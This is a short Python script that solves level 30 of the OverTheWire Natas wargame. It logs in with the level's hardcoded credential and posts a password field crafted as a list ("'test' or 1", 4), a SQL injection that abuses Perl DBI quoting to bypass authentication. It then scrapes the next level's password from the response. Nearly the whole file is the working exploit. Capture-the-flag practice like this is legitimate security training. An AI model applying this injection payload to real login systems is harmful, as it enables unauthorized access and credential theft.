import requests
import re

URL = "http://natas30.natas.labs.overthewire.org/index.pl"
USERNAME = "natas30"
PASSWORD = "wie9iexae0Daihohv8vuu3cei9wahf0e"

x = requests.post(URL, auth=(USERNAME, PASSWORD), data={"username": USERNAME, "password": ["'test' or 1", 4]})
flag = re.findall("<br>(natas31.*)<div", x.text)[0]
print(flag)
